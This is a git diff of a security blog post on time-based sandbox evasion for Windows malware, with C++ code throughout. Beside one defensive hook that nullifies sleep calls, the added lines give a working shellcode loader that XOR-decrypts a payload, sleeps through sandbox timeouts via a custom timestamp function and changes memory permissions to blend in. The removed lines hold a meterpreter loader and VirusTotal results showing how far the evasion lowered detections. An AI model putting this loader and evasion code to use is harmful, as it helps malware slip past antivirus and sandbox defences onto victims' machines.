@@ -1,7 +1,7 @@
 ---
-title: "Sleepy malware is deadly malware"
+title: "Detecting and evading "
 date: 2022-11-20T14:28:34+01:00
-draft: true
+draft: false
 toc: false
 images:
 tags:
@@ -12,7 +12,7 @@ tags:
 ## Sleep isn't for the weak
 Time based evasion techniques **\[T1497\]** are a relatively painless and efficient way of avoiding sandboxes.
 
-MEME HERE
+{{< image src="/img/01/sleepy.png" alt="Sleeping through sandboxes" position="center" style="border-radius: 8px;" >}}
 
 Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it's a guarantee malware will do it's best at staying under the radar, achieving this by either blending in or timing out the sandbox.
 
@@ -26,12 +26,101 @@ A plethora of techniques can be applied to still "sleep", we will see some of th
 
 `Sleep`, `SleepEx` and `Thread.Sleep` all boil down to the `NtDelayExecution` syscall.
 
+> `Sleep` is also just a wrapper around `SleepEx` :)
+> We kinda have a hierarchy such as  `Sleep` -> `SleepEx` -> `NtDelayExecution`
 
+For instance, we can try to hook this syscall to make the delay argument `0` basically nullifying the sleep.
+{{< image src="/img/01/diagram.png" alt="Sleeping through sandboxes" position="center" style="border-radius: 8px;" >}}
+
+We can achieve this by using [MinHook](https://www.codeproject.com/Articles/21414/Powerful-x86-x64-Mini-Hook-Engine) which is a really awesome API hooking library.
+```cpp
+#include "MinHook.h"
+
+
+
+typedef DWORD( NTAPI *pNtDelayExecution )( // https://malapi.io/winapi/NtDelayExecution
+                                            IN BOOLEAN Alertable, 
+                                            IN PLARGE_INTEGER DelayInterval 
+                                         );
+
+
+extern pNtDelayExecution pOrigNtDelayExecution = (pNtDelayExecution)GetProcAddress( GetModuleHandle( L"ntdll.dll" ), "NtDelayExecution" );
+
+// our modified NtDelayExecution
+DWORD NTAPI NtDelayExecution( IN BOOLEAN Alertable, IN PLARGE_INTEGER DelayInterval )
+{
+    // Mock this poor attempt >:)
+    MessageBoxA( 0, "Feeling sleepy??", ":)", 0 );
+
+
+    // Make it so NtDelayExecution actually gets called with a delay of 0, basically nullifying the sleep.
+    return pOrigNtDelayExecution( Alertable, (PLARGE_INTEGER)0 );
+}
+
+
+DWORD WINAPI hook_thread( LPVOID lpReserved ) {
+    
+    MH_STATUS status = MH_CreateHookApi( TEXT( "ntdll" ), "NtDelayExecution", NtDelayExecution, reinterpret_cast<LPVOID*>( &pOrigNtDelayExecution ) );
+
+    // Enable hooks
+    status = MH_EnableHook( MH_ALL_HOOKS );
+    return status;
+}
+
+
+// main function of the dll
+BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: {
+        
+            // Initialize, and if that fails just return -1 aka ERROR
+            if (MH_Initialize() != MH_OK) return -1;
+
+            DisableThreadLibraryCalls( hModule );
+        
+            // Create hooked thread
+            HANDLE hThread = CreateThread( nullptr, 0, hook_thread, hModule, 0, nullptr );
+        }
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+	    }
+
+    return TRUE;
+}
+```
+
+Once injected in a program using any function that ends up calling `NtDelayExecution` (without it having it unhooked) it basically pops open a message box and nullifies the sleep by calling the original `NtDelayExecution` but with a `Delay` of 0.
+
+Then again this is just theorical and to show how it would be possible to hook default sleep functions to nullify them, making malware unable to sleep through sandboxes with those functions at least.
+
+We can for instance use it against an executable calling sleep two times such as
+```cpp
+#include <windows.h>
+#include <iostream>
+
+int main()
+{
+    printf( "Hello!\n" );
+    Sleep( 10000 );
+    printf( "Sleep 2 now\n" );
+    Sleep( 10000 );
+    return 0;
+}
+```
+
+![[messagebox.png]]
+And as we see, once injected in the target proc, when it does call `Sleep` we get a message box :)
+
+## Sleeping via deadcode
 
 ## Weaponizing `__get_timestamp()`
 Credits to Jordan Jay (Legacyy) for his amazing work on this.
-I wont delve too deep on how this works as Legacyy himself [literally made a blogpost about it](https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html) + the code is well commented.
 
+I wont delve too deep on how this works as Legacyy himself [literally made a blogpost about it](https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html) 
 ```cpp
 unsigned long long __get_timestamp()
 {
@@ -46,7 +135,7 @@ unsigned long long __get_timestamp()
 
 As a side note: I edited it to get the time in milliseconds.
 
-##### Making a 
+##### Making an alternative sleep out of it
 
 ```cpp
 void __alt_sleepms( size_t ms )
@@ -60,66 +149,39 @@ And to be even more sneaky, we'll use a random time interval at each with sleep.
 
 Which we can ease by making a macro for that.
 
+## Optimal way of using `__alt_sleepms()`
+
+To avoid creating a pattern, we could leverage rand such as
 ```cpp
 #define INTERVAL rand() % 26 // Edit as you wish
 #define MS_PER_SECOND 1000 
 #define SLEEPTIME INTERVAL*MS_PER_SECOND // Make the use easier
 ```
-
-Then we are simply able to 
+Which makes the use of this function easier and more random (which is a good thing)
 ```cpp
 __alt_sleepms( SLEEPTIME );
 ```
 
-## Loader
-We will use a very basic loader for demo purposes.
-
-I'll simply use a staged **HTTPS** meterpreter shellcode 
-
-1. RWX memory, no shellcode encryption, no sleep in between instructions just simply loud and underdeveloped.
-```cpp
-#include <Windows.h>
-#include "buf.h" // Header file containing our shellcode as "unsigned char buf[]"
-int main()
-{
-	 //Allocate memory for our shellcode
-     PVOID addr;
-    addr = VirtualAlloc( NULL, sizeof( buf ), ( MEM_RESERVE | MEM_COMMIT ), PAGE_EXECUTE_READWRITE );
-
-    memcpy( addr, buf, sizeof( buf ) );
-
-    HANDLE hThread;
-    DWORD id;
-    hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &id );
-
-    WaitForSingleObject( hThread, INFINITE );
- 
-    return 0;
-
-}
-```
-
-3. Loader with alternative sleep + shellcode encryption
+Then we can leverage it in two ways in this basic loader.
+1. Timing out the sandbox by sleeping for a long time before decrypting our shellcode
+2. Sleeping in between changing the permissions of the memory we allocated for our shellcode such as RW -> R -> RX to try to blend in.
 ```cpp
 #include <Windows.h>
 #include "buf.h" // Header file containing our shellcode as "unsigned char buf[]"
 #include "snorlax.h" // Header file containing our time based evasion stuff
 #include "utils.h" // Header file containing RNG related stuff.
 
-
-
 #define INTERVAL rand() % 26 // Edit as you wish
 #define MS_PER_SECOND 1000 
 #define SLEEPTIME INTERVAL*MS_PER_SECOND // Make the use easier
-
-
-
 
 int main()
 {
     // seed our generator 
     srand( defaultseed ); 
-    
+
+	__alt_sleepms( SLEEPTIME * 12 );
+	
     // decrypt our xor encrypted shellcode
     xor_bytes( buf, SHELLCODE_SIZE, key, KEYLEN );
 
@@ -135,12 +197,10 @@ int main()
     DWORD oldProtect;
     VirtualProtect( addr, sizeof( buf ), PAGE_READONLY, &oldProtect );
     
-    //Sleep( SLEEPTIME );
     __alt_sleepms( SLEEPTIME );
 
     VirtualProtect( addr, sizeof( buf ), PAGE_EXECUTE_READ, &oldProtect );
 
-    //Sleep( SLEEPTIME );
     __alt_sleepms( SLEEPTIME );
 
     DWORD id;
@@ -154,23 +214,6 @@ int main()
 
 ```
 
-## Testing
-Our testing of different versions of our loader will go as the following:
-1. Loader with **0 evasion** and **0 shellcode encryption**
-2. Loader with **0 evasion** but with **shellcode encryption**
-3. Loader with both **time based evasion** (fast forward check, alternative sleep in between changes of memory permissions) and **shellcode encryption**
-
-With nothing: https://www.virustotal.com/gui/file/98d4134cb824d533a92920f58a14d7c0fb7543520c950b27943263cbe1389244?nocache= (26/72)
-
-Regular sleeps + changing memory perms: https://www.virustotal.com/gui/file/0d2d6284207fa529fcc05a1091cf3094203576d00d3d381302cb24c4f1f68336?nocache=1 (25/70)
-
-Alt sleep + changing memory perms :https://www.virustotal.com/gui/file/c9c4edcc4e7d5ce5311642f12c2b3884194951c075f106e1bb1452d9dae48bd1?nocache=1 (14/70)
-
-
-This is in the sole goal of knowing the efficiency of each version and therefore of this alternative sleeping method, by using a regular loader detection rate as a baseline for our test and then comparing the regular sleeping method with the alternative one.
-
-
-Results are at the time of testing, the detection ratio might have changed in between the post and its creation.
 
 
 # Credits/Sources
